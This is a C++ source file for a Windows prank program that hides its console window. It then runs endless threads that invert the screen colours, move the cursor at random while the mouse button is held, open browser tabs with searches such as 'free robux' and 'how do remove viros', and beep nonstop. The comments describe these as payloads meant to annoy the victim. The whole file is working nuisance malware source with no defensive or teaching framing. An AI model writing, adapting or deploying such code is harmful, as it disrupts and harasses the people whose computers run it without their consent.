#include <stdio.h>
#include <iostream>
#include <Windows.h>
#include <thread>
#include <WinUser.h>
#include <sapi.h>

void SetMousePosition() {
    // Basic function anyone can make, saw it in someones youtube video (https://www.youtube.com/watch?v=cYh8HAp4OQg)

    int x = rand() % 1024;
    int y = rand() % 1024;
    SetCursorPos(x, y);
}

void invert_colors() {
    while (true) {
        // Not mine but i cannot find the post i originally got it from :/
    
        HDC hDC = GetDC(NULL);
        RECT rcClient;
        GetClientRect(GetDesktopWindow(), &rcClient);
        int nWidth = rcClient.right - rcClient.left;
        int nHeight = rcClient.bottom - rcClient.top;
        HDC hMemDC = CreateCompatibleDC(hDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hDC, nWidth, nHeight);
        HBITMAP hBmOld = (HBITMAP)SelectObject(hMemDC, hBitmap);
        BitBlt(hMemDC, 0, 0, nWidth, nHeight, hDC, 0, 0, SRCCOPY);
        BitBlt(hDC, 0, 0, nWidth, nHeight, hMemDC, 0, 0, DSTINVERT);
        DeleteDC(hMemDC);
        DeleteObject(hBitmap);
        ReleaseDC(NULL, hDC);
        SetCursor(LoadCursor(NULL, IDC_SIZEWE));
        Sleep(4000);

    }
}

void slowly_annoy_the_fuck_out_of_them() {
    while (true) {
        if (GetKeyState(VK_LBUTTON) & 0x8000) {
        
            // Checks if left mouse key is down and if so moves mouse, very ANNOYING
            SetMousePosition();
        }
        Sleep(1000);
    }
}

void startProc(char procName[]) {
    // terrible function for starting proc
    char procBuf[1024];
    sprintf_s(procBuf,"start %s",procName);
    system(procBuf);
}

void browser_troll() {
    while (true) {
        Sleep(4000);
        char procBuf[1024] = "www.bing.com";
        startProc(procBuf);
        Sleep(1000);
        char procBuft[1024] = "www.bing.com/search?q=how+do+remove+viros";
        startProc(procBuft);
        Sleep(rand() % 20000);
        char procBufy[1024] = "www.bing.com/search?q=free+robux";
        startProc(procBufy);
    }
}

void beep_payload() {
    while (true) {
        Beep(2000, 5000);
    }
}

int main() {
    FreeConsole();
    Sleep(10000);
    std::thread thread_obj(invert_colors);
    Sleep(10000);
    std::thread thread_obj_two(slowly_annoy_the_fuck_out_of_them);
    Sleep(5000);
    std::thread thread_obj_three(browser_troll);
    std::thread thread_obj_four(beep_payload);
    thread_obj_four.join();

  

} // 2340
